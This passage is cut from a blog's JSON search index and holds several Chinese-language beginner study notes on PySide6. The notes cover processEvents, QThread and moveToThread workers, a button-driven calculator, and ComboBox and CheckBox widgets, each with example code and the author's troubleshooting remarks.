class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-keyword\">if</span> self.index == <span class=\"hljs-number\">11</span>:   <span class=\"hljs-comment\"># 超出范围则重置</span><br>            self.index = <span class=\"hljs-number\">0</span><br>        self.lb.setPixmap(QPixmap(self.picPath+<span class=\"hljs-built_in\">str</span>(self.index)))<br>        self.index += <span class=\"hljs-number\">1</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#21","url":"/2023/05/16/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-21/","content":"<p>今天的内容是processEvent，以及多线程的一小部分，</p>\n<p>同时，这是PySide6学习的最后一个笔记啦！</p>\n<span id=\"more\"></span>\n\n<p>今天这个笔记应该就是正式学习的最后一篇了，</p>\n<p>最后的作业我就不做了，</p>\n<p>因为我对爬虫处理这块不太懂，</p>\n<p>只会一些简单的。。</p>\n<p>好了开始进入正题吧</p>\n<h1 id=\"processEvent\"><a href=\"#processEvent\" class=\"headerlink\" title=\"processEvent\"></a>processEvent</h1><h2 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h2><p>在做这个笔记之前，</p>\n<p>其实我看了一遍这节课，</p>\n<p>但是根本没有看懂，</p>\n<p>一头雾水，</p>\n<p>然后在开始今天的笔记之前去问了一下chatgpt，</p>\n\n\n<p>总的来说，</p>\n<p>他就是一个类似游乐场售票员的作用，</p>\n<p>一班过山车满员了，</p>\n<p>剩下的游客就要排队等一会儿</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QPushButton<br><span class=\"hljs-keyword\">import</span> time<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.btn = QPushButton(<span class=\"hljs-string\">&#x27;Start&#x27;</span>)<br>        self.btn.clicked.connect(self.start)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.btn)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">start</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">10</span>):<br>            time.sleep(<span class=\"hljs-number\">1</span>)<br>            QApplication.processEvents()<br>            <span class=\"hljs-built_in\">print</span>(i)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<p>这段代码其实就是让界面停止接受用户信号一秒的用处</p>\n<p>ok可以过了</p>\n<h1 id=\"QThread\"><a href=\"#QThread\" class=\"headerlink\" title=\"QThread\"></a>QThread</h1><p>首先是一个简单的多线程示例</p>\n<h2 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h2><h3 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QLabel<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Signal, QThread<br><span class=\"hljs-keyword\">import</span> time<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">WorkThread</span>(<span class=\"hljs-title class_ inherited__\">QThread</span>):<br>    signal = Signal(<span class=\"hljs-built_in\">str</span>)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;run&#x27;</span>)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">run</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">5</span>):<br>            self.signal.emit(<span class=\"hljs-built_in\">str</span>(i))<br>            <span class=\"hljs-built_in\">print</span>(i)<br>            time.sleep(<span class=\"hljs-number\">1</span>)<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.lb = QLabel()<br><br>        self.workThread = WorkThread()<br>        self.workThread.signal.connect(<span class=\"hljs-keyword\">lambda</span> x: self.lb.setText(x))<br>        self.workThread.start()<br><br>        <span class=\"hljs-comment\"># 信号</span><br>        self.workThread.started.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Start&quot;</span>))<br>        self.workThread.finished.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Finish&quot;</span>))<br>        <span class=\"hljs-comment\"># 释放内存资源,如果这里不释放的话，结束程序的时候会出现非零运行return code</span><br>        self.workThread.finished.connect(<span class=\"hljs-keyword\">lambda</span>: self.workThread.deleteLater())<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lb)<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h4><p>原来的workthread里面的函数不是run而是work，</p>\n<p>但是程序并没有正常运行，</p>\n<p>但是像chatgpt说的改成run之后就可以正常运行了，</p>\n<p>这个可能是在start的时候会自动调用子线程里面的run函数</p>\n<h3 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h3>\n\n<h2 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h2><h3 id=\"子类的实例化\"><a href=\"#子类的实例化\" class=\"headerlink\" title=\"子类的实例化\"></a>子类的实例化</h3><h4 id=\"代码-2\"><a href=\"#代码-2\" class=\"headerlink\" title=\"代码\"></a>代码</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QLabel<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Signal, QThread, QObject<br><span class=\"hljs-keyword\">import</span> time<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">WorkThread</span>(<span class=\"hljs-title class_ inherited__\">QObject</span>):<br>    signal = Signal(<span class=\"hljs-built_in\">str</span>)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;run&#x27;</span>)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">run</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">5</span>):<br>            self.signal.emit(<span class=\"hljs-built_in\">str</span>(i))<br>            <span class=\"hljs-built_in\">print</span>(i)<br>            time.sleep(<span class=\"hljs-number\">1</span>)<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.lb = QLabel()<br><br>        self.workThread = WorkThread()<br>        self.threadList = QThread()<br>        self.workThread.moveToThread(self.threadList)<br>        self.threadList.start()<br>        self.workThread.signal.connect(<span class=\"hljs-keyword\">lambda</span> x: self.lb.setText(x))<br>        <span class=\"hljs-comment\">#                        这东西千万不要加括号！！！  ↓</span><br>        self.threadList.started.connect(self.workThread.run)<br>        self.threadList.finished.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;Finish&#x27;</span>))<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lb)<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"区别\"><a href=\"#区别\" class=\"headerlink\" title=\"区别\"></a>区别</h4><p>和上面基础的区别是什么呢？</p>\n<p>问问chatgpt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">这两段代码的主要区别在于 WorkThread 类的继承。<br><br>第一段代码中，WorkThread 继承自 QThread 类。在 run 函数中实现了需要执行的任务，并通过 signal 信号和槽机制与界面控件进行交互。<br><br>第二段代码中，WorkThread 继承自 QObject 类。在 run 函数中同样实现了需要执行的任务，并通过 signal 信号与槽机制传递数据。但是它并没有直接继承自 QThread 类。而是创建了一个新的 QThread 对象 self.threadList，将 WorkThread 对象 self.workThread 移动到 QThread 线程中运行，实现多线程。<br><br>总体来说，第二段代码采用了更为安全和可靠的多线程方式。因为第一段代码中 QThread 子类化常被认为是反模式，在某些情况下可能会导致意外结果和稳定性问题。而第二段代码中则将任务和线程分离，使得程序结构更加清晰，且不受 QThread 的锁和限制影响，具有更好的可维护性和扩展性<br></code></pre></td></tr></table></figure>\n\n<p>总的来说就是平时使用都是下面那种，</p>\n<p>应该就是下面的更加安全一点吧</p>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#3","url":"/2023/04/24/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/","content":"<p>今天做一个简易计算器</p>\n<span id=\"more\"></span>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在前面的笔记中，</p>\n<p>我们已经完善了简单的登陆页面，</p>\n<p>但是我们之前还做了一个计算器的ui，</p>\n<p>今天就来把他解决了！</p>\n<p><a href=\"https://www.bilibili.com/video/BV1c84y1N7iL?p=9&vd_source=1c43bcf31e4abf33f3960dd414786c92\">008练手-完善计算器_哔哩哔哩_bilibili</a></p>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><p>首先，视频里面把每个按钮都重命名了一下，</p>\n<p>这个有助于后面的bind操作</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget<br><span class=\"hljs-keyword\">from</span> calc <span class=\"hljs-keyword\">import</span> Ui_Form<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">CalcTest</span>(QWidget, Ui_Form):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.setupUi(self)<br>        self.result = <span class=\"hljs-string\">&#x27;&#x27;</span><br>        self.bind()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):<br>        self.pushButton_1.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;1&#x27;</span>))<br>        self.pushButton_2.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;2&#x27;</span>))<br>        self.pushButton_3.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;3&#x27;</span>))<br>        self.pushButton_4.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;4&#x27;</span>))<br>        self.pushButton_5.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;5&#x27;</span>))<br>        self.pushButton_6.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;6&#x27;</span>))<br>        self.pushButton_7.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;7&#x27;</span>))<br>        self.pushButton_8.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;8&#x27;</span>))<br>        self.pushButton_9.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;9&#x27;</span>))<br>        self.pushButton_0.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;0&#x27;</span>))<br>        self.pushButton_add.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;+&#x27;</span>))<br>        self.pushButton_jian.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;-&#x27;</span>))<br>        self.pushButton_cheng.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;*&#x27;</span>))<br>        self.pushButton_chu.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;/&#x27;</span>))<br>        self.pushButton_dot.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: self.add_text(<span class=\"hljs-string\">&#x27;.&#x27;</span>))<br>        self.pushButton_suan.clicked.connect(self.calc)<br>        self.pushButton_clear.clicked.connect(self.clear)<br>        self.pushButton_back.clicked.connect(self.backspace)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">backspace</span>(<span class=\"hljs-params\">self</span>):<br>        self.result = self.result[:-<span class=\"hljs-number\">1</span>]<br>        self.lineEdit.setText(self.result)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add_text</span>(<span class=\"hljs-params\">self, num</span>):<br>        self.result += <span class=\"hljs-built_in\">str</span>(num)<br>        self.lineEdit.setText(self.result)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">calc</span>(<span class=\"hljs-params\">self</span>):<br>        self.result = <span class=\"hljs-built_in\">eval</span>(self.result)<br>        self.lineEdit.clear()<br>        self.lineEdit.setText(<span class=\"hljs-built_in\">str</span>(self.result))<br>        self.result = <span class=\"hljs-string\">&#x27;&#x27;</span><br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">clear</span>(<span class=\"hljs-params\">self</span>):<br>        self.result = <span class=\"hljs-string\">&#x27;&#x27;</span><br>        self.lineEdit.setText(self.result)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = CalcTest()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"讲解\"><a href=\"#讲解\" class=\"headerlink\" title=\"讲解\"></a>讲解</h2>\n\n<h1 id=\"我遇到的问题\"><a href=\"#我遇到的问题\" class=\"headerlink\" title=\"我遇到的问题\"></a>我遇到的问题</h1><h3 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1\"></a>1</h3><p>在一开始，我没有使用lambda匿名函数，</p>\n<p>导致无法加入字符，</p>\n<p>只能baskspace和clear和calc，</p>\n<p>然后我看了一下课程，</p>\n<p>恍然大悟！</p>\n<p>这个addtext是需要参数的！</p>\n<p>因此需要lambda来实现一个中转的作用</p>\n<h3 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2\"></a>2</h3><p>然后，</p>\n<p>我还傻了吧唧的给clear和calc和backspace加上lambada，</p>\n<p>但是他们不需要参数直接调用就可以了</p>\n<p>看看chatgpt的解释：</p>\n\n\n\n\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#4","url":"/2023/04/25/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4/","content":"<p>今天学习ComboBox、CheckBox两个控件</p>\n<span id=\"more\"></span>\n\n<h1 id=\"ComboBox\"><a href=\"#ComboBox\" class=\"headerlink\" title=\"ComboBox\"></a>ComboBox</h1><p>这个是下拉框组件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QWidget, QApplication, QComboBox<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        cb = QComboBox(self)<br>        cb.addItems([<span class=\"hljs-string\">&#x27;a&#x27;</span>, <span class=\"hljs-string\">&#x27;b&#x27;</span>, <span class=\"hljs-string\">&#x27;c&#x27;</span>])  <span class=\"hljs-comment\"># 设置初始的一些项</span><br>        cb.addItem(<span class=\"hljs-string\">&#x27;d&#x27;</span>)               <span class=\"hljs-comment\"># 添加一个项</span><br>        <span class=\"hljs-comment\"># 当前文本变化的时候打印出来修改后的文本</span><br>        cb.currentTextChanged.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(cb.currentText()))<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"遇到的坑\"><a href=\"#遇到的坑\" class=\"headerlink\" title=\"遇到的坑\"></a>遇到的坑</h2><h3 id=\"1-低级粗心错误\"><a href=\"#1-低级粗心错误\" class=\"headerlink\" title=\"1 低级粗心错误\"></a>1 低级粗心错误</h3><p>在这里我重新写基础框架的时候，又粗心了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\">app = QApplication([])<br>window = MyWindow()<br></code></pre></td></tr></table></figure>\n\n<p>这两行代码不可以写反，</p>\n<p>我就写成了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\">window = MyWindow()<br>app = QApplication([])<br></code></pre></td></tr></table></figure>\n\n<p>导致出现非正常退出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">进程已结束,退出代码-1073740791 (0xC0000409)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-方法名错误\"><a href=\"#2-方法名错误\" class=\"headerlink\" title=\"2 方法名错误\"></a>2 方法名错误</h3><p>在添加item的时候，</p>\n<p>pycharm的自动补全给我补成了addItem 没有<strong>s</strong></p>\n<p>导致出现报错</p>\n<p>正确的方法名是addItems</p>\n<h2 id=\"知识点\"><a href=\"#知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点</h2><p>这里up提到一个知识点：</p>\n<p>一般输入current，</p>\n<p>编辑器会自动补全后面你想要的内容，</p>\n<p>（当然你可以去看文档</p>\n<p>ComboBox有一个属性，</p>\n<p>叫做editonly，</p>\n<p>就是可编辑的意思，</p>\n<p>如果把这个属性设置为True的话，</p>\n<p>用户可以自己编辑内容并且可以有自动补全的功能，</p>\n<p>比较像我们的IDE自带的代码补全功能</p>\n<h1 id=\"CheckBox\"><a href=\"#CheckBox\" class=\"headerlink\" title=\"CheckBox\"></a>CheckBox</h1><p>检测是否被选中</p>\n<p>就相当于登录QQ时是否自动登录记录密码的这个功能,</p>\n<p>比较简单</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QWidget, QApplication, QCheckBox, QPushButton<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        cb = QCheckBox(<span class=\"hljs-string\">&#x27;记住密码&#x27;</span>, self)<br>        btn = QPushButton(<span class=\"hljs-string\">&#x27;按钮&#x27;</span>, self)<br>        btn.setGeometry(<span class=\"hljs-number\">10</span>, <span class=\"hljs-number\">20</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">50</span>)<br>        btn.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(cb.isChecked()))<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n\n\n<p>如果我想要检测他每次的变化，</p>\n<p>有变化之后立刻做出反应的话，</p>\n<p>就可以这样</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QWidget, QApplication, QCheckBox, QPushButton<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        cb = QCheckBox(<span class=\"hljs-string\">&#x27;记住密码&#x27;</span>, self)<br>        cb.stateChanged.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(cb.checkState()))<br>        btn = QPushButton(<span class=\"hljs-string\">&#x27;按钮&#x27;</span>, self)<br>        btn.setGeometry(<span class=\"hljs-number\">10</span>, <span class=\"hljs-number\">20</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">50</span>)<br>        btn.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(cb.isChecked()))<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n\n\n<p>里面的信号就是stateChanged，</p>\n<p>但是也可以使用isChecked这个东西来检测是否选择了</p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><ol>\n<li><p>ComboBox</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QComboBox, QApplication, QWidget<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.comboBox = QComboBox(self)<br>        self.comboBox.addItems([<span class=\"hljs-string\">&#x27;a&#x27;</span>, <span class=\"hljs-string\">&#x27;b&#x27;</span>])<br>    <br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>CheckBox</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QCheckBox, QApplication, QWidget<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.comboBox = QCheckBox(self)<br>        self.comboBox.clicked.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(comboBox.isChecked()))<br>    <br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure></li>\n</ol>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#5","url":"/2023/04/26/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5/","content":"<p>今天做一个进制转换器</p>\n<span id=\"more\"></span>\n\n<h1 id=\"框架\"><a href=\"#框架\" class=\"headerlink\" title=\"框架\"></a>框架</h1><p>首先，前面讲到过python中的内置函数，</p>\n<p>（可以去我前面的文章来看，就在Note分类之下</p>\n<p>考虑到我的头发问题（：</p>\n<p>以及实用性问题，</p>\n<p>就做2 8 10 16进制之间的转换吧</p>\n<h1 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h1><h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>先把原来的数转换成10进制，</p>\n<p>然后再把转换后的10进制转换用户想要转换的进制，</p>\n<p>这样比较简明，</p>\n<p>这里有个问题，</p>\n<p>就是如果用户输入的是10进制转换为10进制捣乱的话，</p>\n<p>可能会报错</p>\n<p>然后我试了一下验证了我的想法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&gt;&gt;&gt; a = 10<br>&gt;&gt;&gt; b = int(a, 10)<br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>TypeError: int() can&#x27;t convert non-string with explicit base<br>&gt;&gt;&gt; b = int(str(a), 10)<br>&gt;&gt;&gt; b<br>10<br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure>\n\n<p>嗯ok了没事了</p>\n<p>只要传入的是个str就可以照样转换了，</p>\n<p>这样不用单独写一个if判断了</p>\n<h2 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h2><p>就是之前学到的</p>\n<ul>\n<li><p>QComboBox</p>\n</li>\n<li><p>QLineEdit</p>\n</li>\n<li><p>QTextEdit</p>\n</li>\n<li><p>QLable</p>\n</li>\n</ul>\n<h1 id=\"行动\"><a href=\"#行动\" class=\"headerlink\" title=\"行动\"></a>行动</h1><h2 id=\"画\"><a href=\"#画\" class=\"headerlink\" title=\"画\"></a>画</h2><p>首先肯定是画一个Gui界面啦</p>\n\n\n<p>就这样吧</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget<br><span class=\"hljs-keyword\">from</span> ui <span class=\"hljs-keyword\">import</span> Ui_Form<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title 